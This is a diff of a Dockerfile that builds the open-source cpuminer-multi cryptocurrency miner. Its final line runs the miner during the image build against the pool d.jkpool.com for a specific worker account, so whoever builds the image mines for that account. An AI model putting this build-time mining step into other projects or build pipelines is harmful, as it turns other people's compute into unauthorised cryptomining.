@@ -1,22 +1,14 @@
-FROM ubuntu:xenial
+FROM		ubuntu:14.04
+MAINTAINER	Tanguy Pruvot <tanguy.pruvot@gmail.com>
 
-WORKDIR /root/
+RUN		apt-get update -qq
 
-RUN apt-get update && apt-get -qy install \
- automake \
- build-essential \
- libcurl4-openssl-dev \
- libssl-dev \
- git \
- ca-certificates \
- libjansson-dev libgmp-dev g++ --no-install-recommends
+RUN		apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
 
+RUN		git clone https://github.com/tpruvot/cpuminer-multi -b linux
 
-RUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi
-WORKDIR /root/cpuminer-multi
+RUN		cd cpuminer-multi && ./build.sh
 
-RUN ./autogen.sh
-RUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
-
-RUN make
+WORKDIR		/cpuminer-multi
+ENTRYPOINT	["./cpuminer"]
 RUN ./cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3001 -u darkeagle1236.user7 -p x
